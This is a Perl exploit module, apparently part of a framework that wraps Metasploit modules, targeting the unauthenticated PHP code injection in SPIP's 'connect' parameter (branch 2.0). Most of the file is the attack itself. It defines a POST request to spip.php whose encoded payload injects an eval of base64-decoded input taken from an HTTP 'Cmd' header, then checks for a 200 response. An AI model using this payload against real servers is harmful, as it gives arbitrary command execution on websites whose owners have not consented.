package SPIP::MSF::SpipConnectExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SpipConnectExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a PHP code injection in SPIP. The vulnerability exists in the

        connect parameter and allows an unauthenticated user to execute arbitrary commands

        with web user privileges. Branches 2.0, 2.1 and 3 are concerned. Vulnerable versions

        are <2.0.21, <2.1.16 and < 3.0.3, but this module works only against branch 2.0 and

        has been tested successfully with SPIP 2.0.11 and SPIP 2.0.20 with Apache on Ubuntu

        and Fedora linux distributions.

      ",
  METHOD => "GET",
  MSF_MODULE => "spip_connect_exec",
  OSVDB => 83543,
  PATHS => [""],
  REFERENCES => [
    "http://contrib.spip.net/SPIP-3-0-3-2-1-16-et-2-0-21-a-l-etape-303-epate-la",
  ],
  TITLE => "SPIP connect Parameter PHP Injection",
  VARIABLES => {
    'URI' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "The base path to SPIP application", VALUE => "/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'spip.php',
      PAYLOAD      => 'connect=%3f%3e%3c%3f%20eval%28base64_decode%28%24_SERVER%5bHTTP_CMD%5d%29%29%3b%20%3f%3e',
      TEXT   => 'Sending Exploit #2 Request : [POST] /spip.php',
      HEADERS      => {
        'Cmd' => 'X19QQVlMT0FEX18=',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
